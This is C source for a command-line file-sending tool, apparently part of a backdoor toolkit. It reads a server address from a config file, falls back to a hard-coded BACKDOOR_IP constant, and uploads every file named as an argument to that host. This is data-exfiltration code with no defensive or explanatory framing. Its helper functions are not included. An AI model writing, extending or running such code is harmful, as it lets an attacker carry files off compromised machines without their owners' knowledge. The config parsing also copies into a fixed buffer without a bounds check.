#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dirent.h>
#include "socket_tools.h"
#include "tools.h"
#include "cmd_tools.h"

void help(char *name){
	FDBG("%s <file 1> <file 2> ...\n", name); 
}

int read_config(char *file_name, char *svr_ip){
	int fd=0; 
	char *p=NULL, *q=NULL; 
	int len=0; 
	if(!svr_ip) goto err; 
	if(!file_name) goto err; 
	if((fd=open(file_name, O_RDONLY))<0) goto err; 
	lseek(fd, 0, SEEK_SET); 
	if((len=lseek(fd, 0, SEEK_END))<0) goto err; 
	lseek(fd, 0, SEEK_SET); 
	if(!(p=malloc(len))) goto err; 
	if(read(fd, p, len)<0) goto err; 
	if((q=strstr(p, "\t")) ||
	   (q=strstr(p, "\n")) ||
	   (q=strstr(p, " ")) ||
	   (q=strstr(p, "\x0a"))){
		strncpy(svr_ip, p, q-p); 
		svr_ip[q-p]='\0'; 
		FDBG("config %s\n", svr_ip); 
	}
	if(fd) close(fd); 
	if(p) free(p); 
	return 0; 
err: 
	if(svr_ip) strcpy(svr_ip, BACKDOOR_IP); 
	if(fd) close(fd); 
	if(p) free(p); 
	return -1; 
}

int main(int argc, char *argv[]){
	int i=0; 
	char svr_ip[128]; 
	read_config(CONFIG_FILE, svr_ip); 
	if(argc<2) help(argv[0]);  
	for(i=1; i<argc; i++)
		send_files(argv[i], svr_ip); 
	return 0; 
}

